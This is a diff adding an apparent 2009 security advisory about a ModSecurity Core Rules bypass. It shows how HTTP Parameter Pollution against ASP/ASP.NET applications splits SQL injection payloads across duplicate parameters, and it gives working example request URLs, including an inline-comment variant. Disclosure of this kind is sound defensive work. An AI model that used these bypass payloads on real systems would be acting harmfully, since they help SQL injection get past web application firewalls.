@@ -1,0 +1,115 @@
+  ========================================================================
+  ModSecurity (Core Rules) HPP Filter Bypass Vulnerability
+  ========================================================================
+
+  Affected Software : ModSecurity <= 2.5.9 using ModSecurity Core Rules <= 2.5-1.6.1
+  Author                 : Lavakumar Kuppan - lavakumar[dot]in[at]gmail[dot]com
+  Advisory URL       : http://www.lavakumar.com
+  Severity               : High
+  Local/Remote       : Remote
+
+  [Vulnerability Details]
+
+  Modsecurity is an Open source Web Application firewall which runs as an Apache
+  module. It has a comprehensive set of rules called 'ModSecurity Core Rules' for common web application
+  attacks like SQL Injection, Cross-Site Scripting etc.
+
+  It is possible to bypass the ModSecurity Core Rules due to the difference in behaviour
+  of ModSecurity and ASP/ASP.NET applications in handling duplicate HTTP GET/POST/Cookie
+  parameters. Using duplicate parameters has been termed as HTTP Parameter Pollution by Luca Carettoni
+  and Stefano Di Paola.
+
+  When multiple GET/POST/Cookie parameters of the same name are passed in the HTTP request
+  to ASP and ASP.NET applications they are treated as an array collection.
+  This leads to the values being concatenated with a comma inbetween them.
+
+  For example when the following query is sent to the server:
+  -----------------------------
+  POST /index.aspx?a=1&a=2
+  Host: www.example.com
+  Cookie: a=5; a=6
+  Content-Length: 7
+
+  a=3&a=4
+  -----------------------------
+
+  The server side interpretation of this data is as follows:
+
+  Request.Params["a"]        --> "1,2,3,4,5,6" ( if "a" was registered as a server-side control ) (ASP.NET Only)
+  Request.Params["a"]        --> "1,2,5,6" ( if "a" was not registered as a server-side control ) (ASP.NET Only)
+  Request.QueryString["a"] --> "1,2" (ASP and ASP.NET)
+  Request.Form["a"]       --> "3,4" (ASP and ASP.NET)
+
+  This behaviour is unique to ASP and ASP.NET applications and ModSecurity does not interpret this data in the
+  same way. When dealt with multiple parameters of the same name ModSecurity matches the value of each instance
+  of the parameter seperately against its rule base. Incase of the above example ModSecurity would run '1' against
+  the rule set first then '2' and so on till '6'.
+
+  Since data is interpreted differently by the Web Application and the Firewall this produces intresting possibilities
+  for a filter bypass scenario.
+
+  This theory was tested against the SQL Injection rule base of ModSecurity Core Rules and was found to bypass the
+  default-enabled rule set successfully.
+
+  The following request is blocked by ModSecurity as this matches its Generic SQL Injection Attack rule.
+
+   http://example.com/search.aspx?value=select 1,2,3 from table
+
+  ModSecurity Interpretation:
+   value = select 1,2,3 from table
+  Web Application Interpretation:
+   value = select 1,2,3 from table
+
+  However the same payload can be sent to the server by splitting it using duplicate parameters like below.
+
+   http://example.com/search.aspx?value=select 1&value=2,3 from table
+
+  ModSecurity Interpretation:
+   value = select 1
+   value = 2,3 from table
+  Web Application Interpretation:
+   value select 1,2,3 from table
+
+  The attack can be made more flexible by using the inline comment feature in MS SQL servers.
+
+   http://example.com/search.aspx?value=select/*&value=*/1,2,3/*&value=*/from/*&value=*/table
+
+  ModSecurity Interpretation:
+   value=select/*
+   value=*/1,2,3/*
+   value=*/from/*
+   value=*/table
+  Web Application Interpretation:
+   value = select/*,*/1,2,3/*,*/from/*,*/table
+
+  This technique could possibly be extended to exploit other types of Web Application vulnerabilities as well.
+
+  Refer the whitepaper 'Split and Join' (see references) for more details on this attack.
+
+  [Fix Information]
+
+   N/A
+
+  [References]
+
+  http://www.lavakumar.com/Split_and_Join.pdf
+  http://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf
+
+  [Legal Notices]
+
+  The information in the advisory is believed to be accurate at the
+  time of publishing based on currently available information.
+  This information is provided as-is, as a free service to the community.
+  There are no warranties with regard to this information.
+  The author does not accept any liability for any direct,
+  indirect, or consequential loss or damage arising from use of,
+  or reliance on, this information.
+  Permission is hereby granted for the redistribution of this alert,
+  provided that the content is not altered in any way, except
+  reformatting, and that due credit is given.
+
+  This vulnerability has been disclosed in accordance with the RFP
+  Full-Disclosure Policy v2.0, available at:
+  http://www.wiretrip.net/rfp/policy.html
+
+# milw0rm.com [2009-06-11]
